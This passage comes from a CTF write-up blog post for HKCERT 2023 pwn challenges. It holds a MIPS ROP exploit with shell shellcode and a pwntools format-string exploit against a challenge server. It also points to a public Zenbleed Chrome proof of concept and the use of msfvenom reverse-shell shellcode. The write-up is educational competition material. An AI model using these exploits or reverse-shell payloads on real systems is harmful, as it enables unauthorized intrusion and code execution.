sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
<span style="color:#75715e"># misc functions</span>
uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
<span style="color:#75715e">#---</span>

set_sp2s7_jmp_s1  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x041F0A4</span>
<span style="color:#75715e"># .text:0041F0A4                 addiu   $s7, $sp, 0x20+var_8</span>
<span style="color:#75715e"># .text:0041F0A8                 li      $s5, strtoul</span>
<span style="color:#75715e"># .text:0041F0AC                 move    $s0, $v0</span>
<span style="color:#75715e"># .text:0041F0B0                 move    $t9, $s1</span>
<span style="color:#75715e"># .text:0041F0B4                 jalr    $t9</span>

set_ra_s1_s2_s0_jmp_ra <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0400C14</span>
<span style="color:#75715e"># .text:00400C14                 lw      $ra, 0xB8+var_sC($sp)</span>
<span style="color:#75715e"># .text:00400C18                 lw      $s2, 0xB8+var_s8($sp)</span>
<span style="color:#75715e"># .text:00400C1C                 lw      $s1, 0xB8+var_s4($sp)</span>
<span style="color:#75715e"># .text:00400C20                 lw      $s0, 0xB8+var_s0($sp)</span>
<span style="color:#75715e"># .text:00400C24                 jr      $ra</span>

set_sp2a1_jmp_s2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00440784</span>
<span style="color:#75715e"># .text:00440784                 addiu   $a1, $sp, 0x6C+var_38</span>
<span style="color:#75715e"># .text:00440788                 sw      $zero, 0x6C+var_5C($sp)</span>
<span style="color:#75715e"># .text:0044078C                 move    $t9, $s2</span>
<span style="color:#75715e"># .text:00440790                 jalr    $t9</span>

mov_s1_a1_jmp_s0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x044E20C</span>
<span style="color:#75715e"># .text:0044E20C                 move    $s1, $a1</span>
<span style="color:#75715e"># .text:0044E210                 addiu   $s5, $v0, 1</span>
<span style="color:#75715e"># .text:0044E214                 move    $t9, $s0</span>
<span style="color:#75715e"># .text:0044E218                 jalr    $t9 ; strlen</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">76</span>
payload <span style="color:#f92672">+=</span> p32(set_ra_s1_s2_s0_jmp_ra)

sc <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())

payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>)
payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># s0</span>
payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># s1 </span>
payload <span style="color:#f92672">+=</span> p32(set_ra_s1_s2_s0_jmp_ra) <span style="color:#75715e"># s2 [2]</span>
payload <span style="color:#f92672">+=</span> p32(set_sp2a1_jmp_s2) <span style="color:#75715e"># ra [1]</span>

payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x44</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;D&#39;</span>)
payload <span style="color:#f92672">+=</span> sc
payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">196</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;E&#39;</span>)
payload <span style="color:#f92672">+=</span> p32(set_sp2s7_jmp_s1) <span style="color:#75715e"># s0 [4]</span>
payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># s1 </span>
payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># s2</span>
payload <span style="color:#f92672">+=</span> p32(mov_s1_a1_jmp_s0) <span style="color:#75715e"># ra [3]</span>

payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span> <span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+=</span> sc
sl(payload)

p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="absolute-winner-300-points-6-solves">Absolute Winner (300 points, 6 solves)</h2>
<p>This chal gave us the chances to buffer overflow on the stack and only one chance to exploit the format string attack on <code>printf</code>.
When we set a breakpoint one the <code>printf</code> after the <code>pretty_alert</code> function, we can see the stack be like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  tele
<span style="color:#ae81ff">0x007ffcfbc9f8c8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0055d0bf24941a</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>pretty_alert<span style="color:#f92672">+</span><span style="color:#ae81ff">226</span><span style="color:#f92672">&gt;</span> lea rax, [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xbed</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x55d0bf24a00e</span>    <span style="color:#960050;background-color:#1e0010">←</span> <span style="color:#960050;background-color:#1e0010">$</span>rsp
<span style="color:#ae81ff">0x007ffcfbc9f8d0</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0008</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x00000002fbc9fa78</span>
<span style="color:#ae81ff">0x007ffcfbc9f8d8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0010</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x007ffcfbc9f91b</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#ae81ff">0x756f004141414141</span> (<span style="color:#e6db74">&#34;AAAAA&#34;</span><span style="color:#f92672">?</span>)
<span style="color:#ae81ff">0x007ffcfbc9f8e0</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0018</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x007ffcfbc9f950</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#ae81ff">0x007ffcfbc9f960</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#ae81ff">0x0000000000000001</span>   <span style="color:#960050;background-color:#1e0010">←</span> <span style="color:#960050;background-color:#1e0010">$</span>rbp
<span style="color:#ae81ff">0x007ffcfbc9f8e8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0020</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0055d0bf2498ea</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#f92672">&lt;</span>game3<span style="color:#f92672">+</span><span style="color:#ae81ff">635</span><span style="color:#f92672">&gt;</span> mov edi, <span style="color:#ae81ff">0x0</span>
<span style="color:#ae81ff">0x007ffcfbc9f8f0</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0028</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x4141414141410059</span> (<span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">?</span>)
<span style="color:#ae81ff">0x007ffcfbc9f8f8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0030</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x007ffcfbc9f900</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0038</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x007ffcfbc9f908</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0040</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x00000000000001f4</span>
<span style="color:#ae81ff">0x007ffcfbc9f910</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0048</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0000000200000001</span>
</code></pre></div><p><code>rsp+0x0</code> is the return address of the <code>printf</code> function and <code>rsp+0x18</code> is pointing to a stack address.</p>
<p>The exploit idea is simple, modify the value of <code>rsp+0x18</code> and let it pointed to <code>rsp+0x0</code> with <code>%c&quot; * 6 + b&quot;%77c%hhn</code>
and then based on the pointer to modify the return address to <code>printf_flag</code> with %92c%22$hhn<code>. Here I managed to return to </code>printf_flag + 0x5` for avoiding some stack alignment issue.</p>
<h3 id="exploit-script-2">Exploit Script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chal.hkcert23.pwnable.hk&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28246</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
<span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
elf <span style="color:#f92672">=</span> ELF(TARGET)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#75715e"># libc = ELF(&#39;&#39;)</span>
<span style="color:#66d9ef">else</span>:
    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;b *$_base()+0x1415&#34;</span>
    
    <span style="color:#75715e">#p = remote(&#34;127.0.0.1&#34;, 1337)</span>
    p <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug(TARGET, gdbscript<span style="color:#f92672">=</span>gdbscript, aslr<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)

<span style="color:#75715e">#--- helper functions</span>
s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)     
sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
<span style="color:#75715e"># misc functions</span>
uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
<span style="color:#75715e">#---</span>
<span style="color:#75715e"># printf_flag + 0x5</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;N</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span> 
payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x30</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%77c</span><span style="color:#e6db74">%hhn&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%92c</span><span style="color:#e6db74">%22$hhn&#34;</span>

sla(<span style="color:#e6db74">&#34;Are you ready? Y/N : &#34;</span>, payload )
sla(<span style="color:#e6db74">&#34;Are you ready? Y/N : &#34;</span>,  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span>)
sla(<span style="color:#e6db74">&#34;Place a Bet : &#34;</span>, <span style="color:#e6db74">&#34;500&#34;</span>)
sla(<span style="color:#e6db74">&#34;Make a Guess : &#34;</span>, str(<span style="color:#ae81ff">0x1</span>))
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="return-of-babyuxss-return-500-points-2-solves">Return of babyUXSS return (500 points, 2 solves)</h2>
<p>This challenge clearly is same as last year which exploit the bot by a browser exploit. To be honest, I used around 5 minutes to find the POC.
Here is the steps:</p>
<ol>
<li>Google &ldquo;v8ctf writeups&rdquo;</li>
<li>Found the following tweet
<a href="https://twitter.com/_tsuro/status/1718919184040517840">https://twitter.com/_tsuro/status/1718919184040517840</a></li>
<li>Click on the Author Icon to look his post.</li>
<li>Found this post
<a href="https://twitter.com/tchght/status/1722144156267774223">https://twitter.com/tchght/status/1722144156267774223</a></li>
<li>Found the POC of CVE-2023-20593 — Exploiting Zenbleed from Chrome
<a href="https://github.com/vu-ls/Zenbleed-Chrome-PoC">https://github.com/vu-ls/Zenbleed-Chrome-PoC</a></li>
</ol>
<p>After I found the POC, I sent it to my teammate @Hollow and he said just used the msfvenom to generate the reverse shell payload and got a reverse shell back by changing the shellcode in line 248 to a reverse TCP shell shellcode generated by msfvenom.</p></div>
</article>






                    </main><footer>
    <hr />

<p><small>
        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
